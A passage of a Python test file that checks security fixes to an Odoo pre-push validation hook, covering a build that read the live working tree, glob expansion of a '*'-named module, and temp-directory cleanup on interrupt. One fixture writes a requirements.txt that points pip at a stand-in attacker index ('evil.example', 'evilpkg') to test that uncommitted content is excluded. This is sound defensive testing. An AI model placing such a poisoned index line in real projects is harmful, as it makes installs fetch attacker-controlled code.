"""R11 BLUE fixes for two RED breaks in the ENFORCED odoo pre-push gate
(templates/domain-packs/odoo/hooks/pre-push).

DEFECT 1 (HIGH/LIVE) -- the enforced-gate version of R8/R9's "validate the live
tree, not the reviewed ref" bug, which those rounds fixed ONLY on
validate-full.sh's advisory ODOO_DEMO_REBUILD path (see
tests/test_odoo_prepare_base_db_defense2.py). The BLOCKING/enforced gate's own
first-time base-build call (hooks/pre-push, odoo_validate_one_ref's rc==3
branch) invoked `"$HARNESS/prepare-base-db.sh" "$PROJECT"` with NEITHER
PREPARE_BASE_ADDONS_DIR NOR PREPARE_BASE_REQUIREMENTS set -- so
prepare-base-db.sh's own (already-fixed, R8/R9) default fallback
`"${PREPARE_BASE_ADDONS_DIR:-$PROJECT/custom-addons}"` /
`"${PREPARE_BASE_REQUIREMENTS:-$(dirname "$PROJECT_ADDONS")/requirements.txt}"`
resolved straight to the LIVE, mutable working tree: a project's FIRST push
with custom-addons changes (the common/default case) built the shared,
persistent validation base/DB from whatever requirements.txt/custom-addons/*
happened to be on disk at that moment -- build-time `pip install -r` code exec
plus a full live `odoo -i` on unreviewed content -- and entirely bypassed
harness_materialize_tree's RED18b symlink/submodule/path-traversal rejects for
this one path, even though every OTHER validated path in this same hook
already carries that protection.

Fix (see hooks/pre-push): the rc==3 branch now materializes the pushed ref via
a duplicated (byte-identical guarantee, same convention validate-warm.sh/
validate-full.sh already use -- each file duplicates its own copy rather than
sourcing a shared one) `harness_materialize_tree()`, then calls
prepare-base-db.sh with PREPARE_BASE_ADDONS_DIR/PREPARE_BASE_REQUIREMENTS
pointing at that snapshot -- never "$PROJECT". validate-warm.sh's OWN internal
snapshot for this same rc==3 call is already gone by the time control returns
here (its EXIT trap removes it before the rc==3 return), so there is nothing
left over to reuse; the hook must -- and now does -- materialize its own. An
unmaterializable ref fails CLOSED and LOUD, exactly like every other
"could not actually validate" reason in this hook.

DEFECT 2 (MEDIUM/LIVE) -- `$mods` was expanded UNQUOTED at several call sites
in hooks/pre-push (the `# shellcheck disable=SC2086` comments cover the
INTENDED word-splitting but not the SIDE EFFECT of also enabling bash pathname
expansion). A custom-addons module directory literally named `*` (git-legal on
Linux) makes bash glob-expand that word against the current directory at each
such call site, corrupting the module list BEFORE it reaches
check-manifest-files.py -- whose own `resolve_modules()` then finds none of the
glob-substituted filenames under `custom-addons/<name>/__manifest__.py` and
silently drops them all, printing a false "OK: no changed modules to check"
for a screen whose own docstring says it must fail-closed.

Fix: every unquoted $mods expansion site in hooks/pre-push is now wrapped with
`set -f` (noglob) -- inside the enclosing subshell where one already exists
(manifest screen, schema-catalog screen, changed-module-scope.py resolution,
all scoped to that subshell alone), or paired with an immediate `set +f`
right after the one unquoted use where no subshell exists (both
validate-warm.sh invocations inside odoo_validate_one_ref) -- so word-splitting
is preserved but pathname expansion of a `*`/`?`/`[...]`-named module is not.

These tests build small, hermetic fixture git repos/projects under pytest's
tmp_path (never touching the real shared worktree). Docker is mocked with a
scripted fake binary on PATH (matching tests/test_odoo_prepare_base_db_defense2.py's
pattern); no real daemon is required. The enforced gate's own auto-build call
site is driven with SHIMMED validate-warm.sh/prepare-base-db.sh scripts inside
$HARNESS that record what they were handed, matching the stub pattern in
tests/test_odoo_prepare_base_db_defense2.py's DEFECT-1-integration test.

DEFECT 3 (LOW/LIVE, disk hygiene) -- the rc==3 auto-build branch's own
`_base_snap` mktemp dir (materializing the reviewed ref for prepare-base-db.sh,
see DEFECT 1 above) had ZERO `trap`. Its only cleanup was the inline `rm -rf`
calls on the normal/return paths. prepare-base-db.sh blocks ~10min on the
common first-push case, so a signal-interrupted push (Ctrl-C, CI cancel,
closed terminal) landing during that window skips every inline `rm -rf` and
leaks `$HARNESS/.odoo-harness-prepush-snap.XXXXXX` with no reaper. (The R11
commit that introduced `_base_snap` claimed "Snapshot cleaned on every exit" --
false until this fix.)

Fix: `odoo_validate_one_ref` now installs, right before creating `_base_snap`,
`trap '[ -n "${_base_snap:-}" ] && rm -rf "$_base_snap" ... ' EXIT` plus
`trap 'exit 143' TERM` / `trap 'exit 130' INT` -- the same convention
validate-warm.sh already uses (EXIT-trap cleanup + explicit INT/TERM -> exit,
so the EXIT trap deterministically fires on signal termination too). The
guard on `-n "${_base_snap:-}"` makes the trap a safe no-op both before the
variable is assigned and after this function has returned (its `local` goes
out of scope, so the EXIT trap installed here can no longer see it once
control has left the function -- which is exactly why the pre-existing inline
`rm -rf` calls on the ordinary/non-signal failure paths are kept, not removed:
they remain the only cleanup once the signal window has passed).

Non-vacuousness (PROJECT RULE: embedded literals for pre-fix contrast, NEVER
`git show HEAD` at test time):
  - Defect 1: the OLD, unconditioned pre-push call
    (`"$HARNESS/prepare-base-db.sh" "$PROJECT"`, no env override) is
    reproduced literally and driven against the REAL (current) prepare-base-db.sh
    -- which is byte-identical to what hooks/pre-push actually invoked before
    this fix, since only the CALL SITE (not prepare-base-db.sh itself, already
    fixed in R8/R9) changed. It is shown to hand over the live poisoned
    custom-addons module and requirements.txt, proving the defect was real.
  - Defect 2: the OLD unquoted expansion (the exact vulnerable line, minus
    `set -f`) is reproduced literally and driven directly, and shown to
    glob-drop the `*`-named module into a false "OK: no changed modules to
    check" PASS.
  - Defect 3: the OLD (no-trap) shape of the rc==3 auto-build branch is
    reproduced literally as a standalone script and driven with a stub
    `prepare-base-db.sh` that signals its OWN parent (the running script,
    blocked on that call -- standing in for the real ~10min block) with TERM
    mid-call, then exits non-zero itself, mirroring how a real interrupted
    child dies alongside its parent under Ctrl-C/CI-cancel. The OLD shape is
    shown to leak `.odoo-harness-prepush-snap.*`; the FIXED hook, driven
    end-to-end through the same interrupt, is shown not to.
"""
from __future__ import annotations

import os
import stat
import subprocess
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
ODOO_PACK = ROOT / "templates" / "domain-packs" / "odoo"
PRE_PUSH = ODOO_PACK / "hooks" / "pre-push"
HARNESS_SRC = ODOO_PACK / "validation-harness"
REAL_MANIFEST_SCREEN = HARNESS_SRC / "check-manifest-files.py"
REAL_PREPARE_BASE_DB = HARNESS_SRC / "prepare-base-db.sh"

ZERO = "0" * 40

_HARNESS_FILES_FOR_REAL_PREPARE_BASE_DB = [
    "prepare-base-db.sh",
    "harness-preflight.sh",
    "harness-slug.sh",
    "harness-lock.sh",
    "docker-compose.validate.yml",
    "setup_company.py",
]


# --------------------------------------------------------------------------
# shared fixture helpers (mirrors tests/test_odoo_harness_honesty_r2.py /
# tests/test_odoo_prepare_base_db_defense2.py's established patterns)
# --------------------------------------------------------------------------
def _git(args: list[str], cwd: Path, check: bool = True) -> subprocess.CompletedProcess[str]:
    return subprocess.run(["git", *args], cwd=cwd, text=True, capture_output=True, check=check)


def _init_repo(path: Path) -> None:
    path.mkdir(parents=True, exist_ok=True)
    _git(["init", "-q", "-b", "main"], path)
    _git(["config", "user.email", "t@example.invalid"], path)
    _git(["config", "user.name", "T"], path)


def _commit_all(path: Path, message: str) -> str:
    _git(["add", "-A"], path)
    _git(["commit", "-q", "-m", message], path)
    return _git(["rev-parse", "HEAD"], path).stdout.strip()


def _make_executable(path: Path) -> None:
    path.chmod(path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)


def _make_module(root: Path, name: str, extra_files: dict[str, str] | None = None) -> None:
    mod = root / name
    mod.mkdir(parents=True, exist_ok=True)
    (mod / "__manifest__.py").write_text(
        "{'name': %r, 'depends': [], 'installable': True}\n" % name, encoding="utf-8"
    )
    for rel, content in (extra_files or {}).items():
        p = mod / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")


def _run_prepush(project: Path, lsha: str, rsha: str, env_extra: dict | None = None):
    stdin = f"refs/heads/main {lsha} refs/heads/main {rsha}\n"
    env = os.environ.copy()
    for k in (
        "ODOO_HARNESS_DIR", "SKIP_ODOO_VALIDATE", "AI_AUTO_ODOO_UNVALIDATED_ACK_BY",
        "AI_AUTO_PRINCIPAL_EVIDENCE", "AI_AUTO_PROVENANCE_KEY_FILE", "AI_AUTO_HOME",
        "ODOO_SKIP_AUTO_BASE",
    ):
        env.pop(k, None)
    if env_extra:
        env.update(env_extra)
    return subprocess.run(
        ["bash", str(PRE_PUSH)],
        cwd=project,
        input=stdin,
        env=env,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    )


def _fake_docker_noop(tmp_path: Path, name: str = "fakebin") -> Path:
    """A hermetic, no-op fake `docker`: succeeds unconditionally for any
    subcommand. Enough for the enforced-gate flow when validate-warm.sh and
    prepare-base-db.sh are themselves fully shimmed (they never actually shell
    out to `docker compose` in these tests)."""
    bin_dir = tmp_path / name
    bin_dir.mkdir(exist_ok=True)
    docker = bin_dir / "docker"
    docker.write_text("#!/usr/bin/env bash\nexit 0\n", encoding="utf-8")
    _make_executable(docker)
    return bin_dir


# A small, SCRIPTED fake `docker` (mirrors tests/test_odoo_prepare_base_db_defense2.py)
# for the tests that drive the REAL prepare-base-db.sh end-to-end.
_FAKE_DOCKER_SH = """#!/usr/bin/env bash
set -u
: "${DOCKER_CALL_LOG:?DOCKER_CALL_LOG not set}"
printf '%s\\n' "$*" >> "$DOCKER_CALL_LOG"
case "${1:-}" in
  version) echo "24.0.0"; exit 0 ;;
  info) exit 0 ;;
  rm) exit 0 ;;
esac
if [ "${1:-}" = "compose" ]; then
  shift
  if [ "${1:-}" = "-f" ]; then shift 2; fi
  verb="${1:-}"
  case "$verb" in
    build) exit 0 ;;
    up) exit 0 ;;
    exec)
      rest="$*"
      case "$rest" in
        *psql*) printf 'base                                                            | odoo     | UTF8     |\\n'; exit 0 ;;
        *) exit 0 ;;
      esac
      ;;
    run)
      if [ -n "${FAKE_DOCKER_RUN_OUTPUT:-}" ]; then printf '%s\\n' "$FAKE_DOCKER_RUN_OUTPUT"; fi
      exit "${FAKE_DOCKER_RUN_EXIT:-0}"
      ;;
    *) exit 0 ;;
  esac
fi
exit 0
"""


def _fake_docker_scripted(tmp_path: Path, log_path: Path) -> Path:
    bin_dir = tmp_path / "fakebin-scripted"
    bin_dir.mkdir(exist_ok=True)
    docker = bin_dir / "docker"
    docker.write_text(_FAKE_DOCKER_SH, encoding="utf-8")
    _make_executable(docker)
    log_path.write_text("", encoding="utf-8")
    return bin_dir


# ==========================================================================
# DEFECT 1 -- enforced-gate auto-build must validate the REVIEWED ref, never
# the live working tree, via the same harness_materialize_tree guarantee.
# ==========================================================================

# Records every call's argv + PREPARE_BASE_ADDONS_DIR/PREPARE_BASE_REQUIREMENTS
# (and the addons dir's contents + requirements file's contents, if present) to
# STUB_LOG, then always exits 0 -- so a full pre-push run reaches "base built".
_STUB_PREPARE_BASE_DB_SH = """#!/usr/bin/env bash
set -u
: "${STUB_LOG:?STUB_LOG not set}"
{
  echo "==CALL=="
  echo "ARGV: $*"
  echo "PREPARE_BASE_ADDONS_DIR=${PREPARE_BASE_ADDONS_DIR:-<unset>}"
  echo "PREPARE_BASE_REQUIREMENTS=${PREPARE_BASE_REQUIREMENTS:-<unset>}"
  if [ -n "${PREPARE_BASE_ADDONS_DIR:-}" ] && [ -d "${PREPARE_BASE_ADDONS_DIR}" ]; then
    echo "ADDONS_DIR_CONTENTS:"
    ls "${PREPARE_BASE_ADDONS_DIR}"
  fi
  if [ -n "${PREPARE_BASE_REQUIREMENTS:-}" ] && [ -f "${PREPARE_BASE_REQUIREMENTS}" ]; then
    echo "REQUIREMENTS_CONTENTS:"
    cat "${PREPARE_BASE_REQUIREMENTS}"
  fi
} >> "$STUB_LOG"
exit "${STUB_PREPARE_EXIT:-0}"
"""

# Returns rc=3 (base missing) on its FIRST invocation, rc=0 on every later one --
# simulating the exact "warm base missing -> auto-build -> re-run" branch this
# defect lives in, without needing a real docker-backed validate-warm.sh run.
_STUB_VALIDATE_WARM_SH = """#!/usr/bin/env bash
set -u
: "${VW_CALL_LOG:?VW_CALL_LOG not set}"
: "${VW_COUNT_FILE:?VW_COUNT_FILE not set}"
printf 'CALL: %s\\n' "$*" >> "$VW_CALL_LOG"
n=$(cat "$VW_COUNT_FILE" 2>/dev/null || echo 0)
n=$((n+1))
echo "$n" > "$VW_COUNT_FILE"
if [ "$n" -eq 1 ]; then
  echo "[warm] base DB missing"
  exit 3
fi
echo "[warm] PASS (fake, call #$n)"
exit "${VW_SECOND_CALL_EXIT:-0}"
"""


def _harness_with_stubs(tmp_path: Path, stub_log: Path, vw_log: Path, vw_count_file: Path) -> Path:
    harness = tmp_path / "harness"
    harness.mkdir()
    vw = harness / "validate-warm.sh"
    vw.write_text(_STUB_VALIDATE_WARM_SH, encoding="utf-8")
    _make_executable(vw)
    pb = harness / "prepare-base-db.sh"
    pb.write_text(_STUB_PREPARE_BASE_DB_SH, encoding="utf-8")
    _make_executable(pb)
    stub_log.write_text("", encoding="utf-8")
    vw_log.write_text("", encoding="utf-8")
    return harness


def _make_poisoned_project(tmp_path: Path) -> tuple[Path, str]:
    """A project whose committed (pushed) tip has a clean mod1 + clean
    requirements.txt, and whose LIVE working tree (uncommitted, after that
    commit) additionally carries a poison_mod module and a poisoned
    requirements.txt -- exactly RED17b-2/AUD-RCE1's shape, one hop into the
    enforced gate's own auto-build call."""
    project = tmp_path / "project"
    _init_repo(project)
    # A root commit precedes the module-adding one: `git diff-tree` (used by
    # pre-push's own commit enumeration) prints NOTHING for a parentless root
    # commit (a pre-existing, orthogonal quirk -- see
    # tests/test_odoo_prepush_enum_and_names_r8.py's identical note), so the
    # tip pushed here must not itself be the repo's first commit.
    (project / "README.md").write_text("base\n", encoding="utf-8")
    _commit_all(project, "base")
    _make_module(project / "custom-addons", "mod1")
    (project / "requirements.txt").write_text("cleanpkg==1.0\n", encoding="utf-8")
    tip_sha = _commit_all(project, "reviewed: mod1 + clean requirements.txt")

    # LIVE-only, uncommitted mutations -- never part of tip_sha's tree.
    _make_module(project / "custom-addons", "poison_mod")
    (project / "requirements.txt").write_text(
        "--index-url http://evil.example/simple\nevilpkg==9.9.9\n", encoding="utf-8"
    )
    return project, tip_sha


def test_enforced_autobuild_uses_reviewed_ref_snapshot_not_live_poison(tmp_path):
    project, tip_sha = _make_poisoned_project(tmp_path)

    stub_log = tmp_path / "stub.log"
    vw_log = tmp_path / "vw.log"
    vw_count_file = tmp_path / "vw.count"
    harness = _harness_with_stubs(tmp_path, stub_log, vw_log, vw_count_file)
    fake_docker = _fake_docker_noop(tmp_path)

    env_extra = {
        "ODOO_HARNESS_DIR": str(harness),
        "PATH": f"{fake_docker}:{os.environ.get('PATH', '')}",
        "VW_CALL_LOG": str(vw_log),
        "VW_COUNT_FILE": str(vw_count_file),
        "STUB_LOG": str(stub_log),
    }
    result = _run_prepush(project, lsha=tip_sha, rsha=ZERO, env_extra=env_extra)

    assert "base built" in result.stdout, result.stdout
    assert "Odoo validation passed" in result.stdout, result.stdout
    assert result.returncode == 0, result.stdout

    stub_calls = stub_log.read_text(encoding="utf-8")
    assert "PREPARE_BASE_ADDONS_DIR=<unset>" not in stub_calls, (
        "the enforced-gate auto-build invoked prepare-base-db.sh WITHOUT "
        f"PREPARE_BASE_ADDONS_DIR -- the fix is missing. stub log:\n{stub_calls}"
    )
    assert "PREPARE_BASE_REQUIREMENTS=<unset>" not in stub_calls, (
        f"PREPARE_BASE_REQUIREMENTS was never set either. stub log:\n{stub_calls}"
    )
    live_addons = str(project / "custom-addons")
    live_reqs = str(project / "requirements.txt")
    assert f"PREPARE_BASE_ADDONS_DIR={live_addons}" not in stub_calls, (
        f"the LIVE project addons dir was handed over verbatim. stub log:\n{stub_calls}"
    )
    assert f"PREPARE_BASE_REQUIREMENTS={live_reqs}" not in stub_calls, (
        f"the LIVE project requirements.txt path was handed over verbatim. stub log:\n{stub_calls}"
    )
    # The snapshot handed over reflects the COMMITTED (pushed) tree only.
    assert "mod1" in stub_calls, stub_calls
    assert "poison_mod" not in stub_calls, (
        "the LIVE, uncommitted poison_mod leaked into the enforced gate's base "
        f"build. stub log:\n{stub_calls}"
    )
    assert "cleanpkg" in stub_calls, stub_calls
    assert "evilpkg" not in stub_calls and "evil.example" not in stub_calls, (
        "the LIVE, uncommitted poisoned requirements.txt leaked into the "
        f"enforced gate's base build. stub log:\n{stub_calls}"
    )


def test_enforced_autobuild_still_blocks_on_genuine_base_build_failure(tmp_path):
    """Regression: a genuinely failing base build must still BLOCK the push --
    the fix must not turn a real failure into a silent pass."""
    project, tip_sha = _make_poisoned_project(tmp_path)

    stub_log = tmp_path / "stub.log"
    vw_log = tmp_path / "vw.log"
    vw_count_file = tmp_path / "vw.count"
    harness = _harness_with_stubs(tmp_path, stub_log, vw_log, vw_count_file)
    fake_docker = _fake_docker_noop(tmp_path)

    env_extra = {
        "ODOO_HARNESS_DIR": str(harness),
        "PATH": f"{fake_docker}:{os.environ.get('PATH', '')}",
        "VW_CALL_LOG": str(vw_log),
        "VW_COUNT_FILE": str(vw_count_file),
        "STUB_LOG": str(stub_log),
        "STUB_PREPARE_EXIT": "1",  # base build itself fails
    }
    result = _run_prepush(project, lsha=tip_sha, rsha=ZERO, env_extra=env_extra)

    assert result.returncode != 0, result.stdout
    assert "base build failed" in result.stdout, result.stdout


def test_enforced_autobuild_still_blocks_on_genuine_validation_failure_after_build(tmp_path):
    """Regression: once the base is (successfully) built, a genuine validation
    FAIL on the re-run must still BLOCK the push."""
    project, tip_sha = _make_poisoned_project(tmp_path)

    stub_log = tmp_path / "stub.log"
    vw_log = tmp_path / "vw.log"
    vw_count_file = tmp_path / "vw.count"
    harness = _harness_with_stubs(tmp_path, stub_log, vw_log, vw_count_file)
    fake_docker = _fake_docker_noop(tmp_path)

    env_extra = {
        "ODOO_HARNESS_DIR": str(harness),
        "PATH": f"{fake_docker}:{os.environ.get('PATH', '')}",
        "VW_CALL_LOG": str(vw_log),
        "VW_COUNT_FILE": str(vw_count_file),
        "STUB_LOG": str(stub_log),
        "VW_SECOND_CALL_EXIT": "1",  # re-run after a successful build still fails
    }
    result = _run_prepush(project, lsha=tip_sha, rsha=ZERO, env_extra=env_extra)

    assert result.returncode != 0, result.stdout
    assert "base built" in result.stdout, result.stdout
    assert "Odoo validation failed for pushed commit" in result.stdout, result.stdout


# Non-vacuousness control for DEFECT 1: the OLD, unconditioned pre-push call
# (`"$HARNESS/prepare-base-db.sh" "$PROJECT"`, exactly what line 371 used to
# read, no env override at all) driven against the REAL, current
# prepare-base-db.sh -- proving that without the call-site fix, the live
# poisoned tree would have been used (prepare-base-db.sh's own
# PREPARE_BASE_ADDONS_DIR/PREPARE_BASE_REQUIREMENTS contract, fixed in R8/R9,
# is unconditioned by nothing else here -- the bug this round closes was
# entirely in the CALL SITE, not the callee).
OLD_AUTOBUILD_CALL_SH = """#!/usr/bin/env bash
set -e
HARNESS="$1"
PROJECT="$2"
"$HARNESS/prepare-base-db.sh" "$PROJECT"
"""


def test_old_unconditioned_autobuild_call_would_have_used_live_poisoned_tree(tmp_path):
    project, _tip_sha = _make_poisoned_project(tmp_path)

    harness = tmp_path / "harness_old"
    harness.mkdir()
    for fname in _HARNESS_FILES_FOR_REAL_PREPARE_BASE_DB:
        (harness / fname).write_bytes((HARNESS_SRC / fname).read_bytes())
        _make_executable(harness / fname)

    docker_log = tmp_path / "docker_old.log"
    fake_docker = _fake_docker_scripted(tmp_path, docker_log)

    old_script = tmp_path / "old_autobuild_call.sh"
    old_script.write_text(OLD_AUTOBUILD_CALL_SH, encoding="utf-8")
    _make_executable(old_script)

    env = os.environ.copy()
    env["PATH"] = f"{fake_docker}:{env.get('PATH', '')}"
    env["DOCKER_CALL_LOG"] = str(docker_log)
    env["HARNESS_LOCK_FILE"] = str(tmp_path / "lock")
    for k in ("PREPARE_BASE_ADDONS_DIR", "PREPARE_BASE_REQUIREMENTS"):
        env.pop(k, None)

    result = subprocess.run(
        ["bash", str(old_script), str(harness), str(project)],
        env=env, text=True, capture_output=True, check=False,
    )

    assert result.returncode == 0, result.stdout + result.stderr
    assert "poison_mod" in result.stdout, (
        "the embedded pre-fix (unconditioned) call no longer picks up the live "
        f"poison_mod -- this control is no longer discriminating. stdout:\n{result.stdout}"
    )
    deps = (harness / ".deps.txt").read_text(encoding="utf-8")
    assert "evilpkg" in deps and "evil.example" in deps, (
        "the embedded pre-fix (unconditioned) call no longer picks up the live "
        f"poisoned requirements.txt -- this control is no longer discriminating. .deps.txt:\n{deps}"
    )


# ==========================================================================
# DEFECT 2 -- glob-safety of the $mods module list. A module directory
# literally named `*` must never be silently dropped by pathname expansion.
# ==========================================================================
def test_star_named_module_is_not_silently_dropped_by_manifest_screen(tmp_path):
    project = tmp_path / "project"
    _init_repo(project)
    _make_module(project / "custom-addons", "mod1")
    _make_module(project / "custom-addons", "*")
    base_sha = _commit_all(project, "base")
    (project / "custom-addons" / "*" / "views.xml").write_text("<odoo/>\n", encoding="utf-8")
    new_sha = _commit_all(project, "touch the star-named module")

    harness = tmp_path / "harness"
    harness.mkdir()
    (harness / "check-manifest-files.py").write_bytes(REAL_MANIFEST_SCREEN.read_bytes())

    result = _run_prepush(
        project, lsha=new_sha, rsha=base_sha, env_extra={"ODOO_HARNESS_DIR": str(harness)}
    )

    assert "[manifest-files] OK: no changed modules to check" not in result.stdout, (
        "the `*`-named module was silently glob-dropped, producing a false "
        f"'no changed modules' PASS. stdout:\n{result.stdout}"
    )
    # It must show up as a module the screen actually looked at.
    assert "module(s):" in result.stdout, result.stdout
    assert "*" in result.stdout.split("module(s):", 1)[1].split("\n", 1)[0], result.stdout


def test_plain_module_names_still_resolve_and_validate_normally(tmp_path):
    """Regression: an ordinary (no glob metacharacters) module name must still
    resolve and pass exactly as before the glob-safety fix."""
    project = tmp_path / "project"
    _init_repo(project)
    _make_module(project / "custom-addons", "mod1")
    base_sha = _commit_all(project, "base")
    (project / "custom-addons" / "mod1" / "views.xml").write_text("<odoo/>\n", encoding="utf-8")
    new_sha = _commit_all(project, "add a view")

    harness = tmp_path / "harness"
    harness.mkdir()
    (harness / "check-manifest-files.py").write_bytes(REAL_MANIFEST_SCREEN.read_bytes())

    result = _run_prepush(
        project, lsha=new_sha, rsha=base_sha, env_extra={"ODOO_HARNESS_DIR": str(harness)}
    )

    assert "[manifest-files] OK" in result.stdout, result.stdout
    assert "mod1" in result.stdout, result.stdout
    assert "no changed modules to check" not in result.stdout, result.stdout


def test_manifest_screen_still_blocks_on_a_real_missing_file_with_star_module_present(tmp_path):
    """Regression/no-over-widening: a genuine missing-data-file defect in an
    ordinary module must still BLOCK even when an unrelated `*`-named module
    is also part of the changed set."""
    project = tmp_path / "project"
    _init_repo(project)
    _make_module(project / "custom-addons", "*")
    mod_dir = project / "custom-addons" / "mod1"
    mod_dir.mkdir(parents=True)
    (mod_dir / "__manifest__.py").write_text(
        "{'name': 'mod1', 'depends': [], 'data': ['views/missing.xml']}\n", encoding="utf-8"
    )
    base_sha = _commit_all(project, "base")
    (project / "custom-addons" / "*" / "views.xml").write_text("<odoo/>\n", encoding="utf-8")
    (mod_dir / "views.xml").write_text("<odoo/>\n", encoding="utf-8")
    new_sha = _commit_all(project, "touch both modules")

    harness = tmp_path / "harness"
    harness.mkdir()
    (harness / "check-manifest-files.py").write_bytes(REAL_MANIFEST_SCREEN.read_bytes())

    result = _run_prepush(
        project, lsha=new_sha, rsha=base_sha, env_extra={"ODOO_HARNESS_DIR": str(harness)}
    )

    assert result.returncode != 0, result.stdout
    assert "a __manifest__.py references a missing file" in result.stdout, result.stdout


# Non-vacuousness control for DEFECT 2: the exact pre-fix vulnerable line
# (unquoted $mods expansion, no `set -f`), embedded literally -- reproduces the
# RED PoC directly: bash pathname-expands the `*` module token against the
# project root before check-manifest-files.py ever sees it.
OLD_MODULE_EXPAND_SH = """#!/usr/bin/env bash
set -u
project="$1"
mf_screen="$2"
mods="$3"
cd "$project"
# OLD (pre-fix) exact vulnerable line from hooks/pre-push: no `set -f`, so the
# unquoted expansion below undergoes BOTH word-splitting AND pathname expansion.
python3 "$mf_screen" --modules $mods
"""


def test_old_unquoted_expansion_would_have_glob_dropped_the_star_module(tmp_path):
    # Deliberately ONLY the `*`-named module in scope (no other module coexists):
    # this isolates the drop. (A companion module like `mod1` would still resolve
    # on its own merit even after `*` glob-corrupts into unrelated filenames --
    # see the sibling regression test above for that mixed-scope case -- so
    # proving the exact "OK: no changed modules to check" false-PASS wording
    # from the task's PoC needs the ENTIRE changed-module scope to be `*`.)
    project = tmp_path / "project"
    _init_repo(project)
    _make_module(project / "custom-addons", "*")
    (project / "README.md").write_text("plenty of files here to glob-match *\n", encoding="utf-8")
    _commit_all(project, "base")

    old_script = tmp_path / "old_module_expand.sh"
    old_script.write_text(OLD_MODULE_EXPAND_SH, encoding="utf-8")
    _make_executable(old_script)

    result = subprocess.run(
        ["bash", str(old_script), str(project), str(REAL_MANIFEST_SCREEN), "*"],
        text=True, capture_output=True, check=False,
    )

    assert "[manifest-files] OK: no changed modules to check" in result.stdout, (
        "the embedded pre-fix (unquoted, no `set -f`) expansion no longer "
        f"glob-drops the `*` module -- this control is no longer discriminating. "
        f"stdout:\n{result.stdout}"
    )


# ==========================================================================
# DEFECT 3 -- the rc==3 auto-build branch's `_base_snap` mktemp dir must be
# cleaned up even when a signal (Ctrl-C / CI cancel) interrupts the ~10min
# prepare-base-db.sh block, not only on the ordinary return paths.
# ==========================================================================

# A `prepare-base-db.sh` stand-in that simulates a Ctrl-C / CI-cancel landing
# on the whole foreground process group WHILE this call (standing in for the
# real ~10min block) is in flight: it signals its OWN parent (the pre-push
# process, blocked waiting on this child) with TERM, then exits non-zero
# itself -- exactly how a real interrupted child dies alongside its parent.
_STUB_PREPARE_BASE_DB_SIGTERM_SH = """#!/usr/bin/env bash
set -u
: "${STUB_LOG:?STUB_LOG not set}"
echo "==CALL (signal-interrupt stub)==" >> "$STUB_LOG"
kill -TERM "$PPID" 2>/dev/null || true
sleep 0.2
exit 143
"""


def test_enforced_autobuild_signal_interrupt_leaves_no_leaked_snapshot(tmp_path):
    """Non-vacuous positive: the FIXED hook's trap removes `_base_snap` even
    when prepare-base-db.sh's block is interrupted by a signal landing on the
    whole foreground process group mid-call."""
    project, tip_sha = _make_poisoned_project(tmp_path)

    stub_log = tmp_path / "stub.log"
    vw_log = tmp_path / "vw.log"
    vw_count_file = tmp_path / "vw.count"
    harness = _harness_with_stubs(tmp_path, stub_log, vw_log, vw_count_file)
    # Swap in the signal-interrupting prepare-base-db.sh stub in place of the
    # always-succeeds one _harness_with_stubs installs by default.
    pb = harness / "prepare-base-db.sh"
    pb.write_text(_STUB_PREPARE_BASE_DB_SIGTERM_SH, encoding="utf-8")
    _make_executable(pb)
    fake_docker = _fake_docker_noop(tmp_path)

    env_extra = {
        "ODOO_HARNESS_DIR": str(harness),
        "PATH": f"{fake_docker}:{os.environ.get('PATH', '')}",
        "VW_CALL_LOG": str(vw_log),
        "VW_COUNT_FILE": str(vw_count_file),
        "STUB_LOG": str(stub_log),
    }
    result = _run_prepush(project, lsha=tip_sha, rsha=ZERO, env_extra=env_extra)

    # Reached the actual risk window (proves this drives the intended branch,
    # not some earlier unrelated exit)...
    assert "building it now" in result.stdout, result.stdout
    # ...but the interrupt preempts continuing past it: neither the "base
    # build failed" message nor "base built" / "Odoo validation passed" is
    # ever reached (matches the empirically-verified bash behavior: a pending
    # trapped signal is processed the instant the foreground child call
    # returns, before the enclosing `if` body runs).
    assert "base built" not in result.stdout, result.stdout
    assert "Odoo validation passed" not in result.stdout, result.stdout
    assert result.returncode != 0, result.stdout

    leaked = list(harness.glob(".odoo-harness-prepush-snap.*"))
    assert not leaked, (
        f"the fixed hook still leaked a snapshot dir on signal interrupt: {leaked}. "
        f"stdout:\n{result.stdout}"
    )


def test_enforced_autobuild_normal_completion_still_leaves_no_leaked_snapshot(tmp_path):
    """Regression: an uninterrupted, successful auto-build still cleans up
    `_base_snap` and still validates (the trap must not disturb the ordinary
    path -- already covered functionally by
    test_enforced_autobuild_uses_reviewed_ref_snapshot_not_live_poison; this
    test isolates just the "no leaked snapshot dir remains" assertion)."""
    project, tip_sha = _make_poisoned_project(tmp_path)

    stub_log = tmp_path / "stub.log"
    vw_log = tmp_path / "vw.log"
    vw_count_file = tmp_path / "vw.count"
    harness = _harness_with_stubs(tmp_path, stub_log, vw_log, vw_count_file)
    fake_docker = _fake_docker_noop(tmp_path)

    env_extra = {
        "ODOO_HARNESS_DIR": str(harness),
        "PATH": f"{fake_docker}:{os.environ.get('PATH', '')}",
        "VW_CALL_LOG": str(vw_log),
        "VW_COUNT_FILE": str(vw_count_file),
        "STUB_LOG": str(stub_log),
    }
    result = _run_prepush(project, lsha=tip_sha, rsha=ZERO, env_extra=env_extra)

    assert "Odoo validation passed" in result.stdout, result.stdout
    assert result.returncode == 0, result.stdout
    leaked = list(harness.glob(".odoo-harness-prepush-snap.*"))
    assert not leaked, f"a successful auto-build leaked a snapshot dir: {leaked}"


def test_enforced_autobuild_unmaterializable_ref_still_blocks_with_no_leak(tmp_path):
    """Regression: the fail-closed "cannot materialize pushed ref" path (a
    changed-modules scope whose only committed content is a rejected entry --
    here, a symlink, mirroring harness_materialize_tree's own RED18b reject)
    must still BLOCK the push, and must still leave no leaked snapshot dir
    (this path's cleanup is the pre-existing inline `rm -rf`, kept as-is by
    this round's fix; the trap only adds coverage for the signal-interrupt
    case above)."""
    project = tmp_path / "project"
    _init_repo(project)
    (project / "README.md").write_text("base\n", encoding="utf-8")
    _commit_all(project, "base")
    # The ONLY custom-addons entry is a symlink -- harness_materialize_tree
    # skips symlink entries (mode 120000), so n stays 0 and materialization
    # fails, even though the changed-file path still matches `mods`'s
    # `custom-addons/<name>/...` pattern (entering the auto-build branch).
    mod_dir = project / "custom-addons" / "mod1"
